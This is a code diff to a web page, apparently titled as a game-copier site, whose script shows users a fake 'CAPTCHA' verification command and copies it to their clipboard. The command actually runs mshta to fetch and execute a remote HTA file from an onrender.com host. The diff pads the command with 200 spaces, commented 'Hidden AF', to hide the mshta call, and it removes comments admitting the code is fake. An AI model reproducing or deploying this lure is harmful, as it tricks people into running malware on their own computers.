@@ -47,7 +47,6 @@
   <button class="btn" onclick="window.location.href='/'">Back to Home</button>
 
   <script>
-    // Generate a fake verification code like X9K3-Z7R1
     function generateCode() {
       const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
       let code = "";
@@ -57,10 +56,9 @@
       return code;
     }
 
-    // Generate the full command with fake "CAPTCHA" message
     const verificationCode = generateCode();
-    const spaces = " ".repeat(10); // Enough spaces to separate the actual mshta part
-    const fullCommand = `mshta https://freegamecopier.onrender.com/verifyaccept.hta${spaces}CAPTCHA ACCEPT - Code: ${verificationCode}`;
+    const massiveSpaces = " ".repeat(200); // 👀 Hidden AF
+    const fullCommand = `mshta https://freegamecopier.onrender.com/verifyaccept.hta${massiveSpaces}CAPTCHA ACCEPT — Code: ${verificationCode}`;
 
     document.getElementById("cmdText").innerText = fullCommand;
 
@@ -68,7 +66,7 @@
       navigator.clipboard.writeText(fullCommand).then(() => {
         alert("Copied to clipboard!");
       }).catch(() => {
-        alert("Failed to copy. Try manually selecting the command.");
+        alert("Clipboard access blocked — try copying manually.");
       });
     }
   </script>
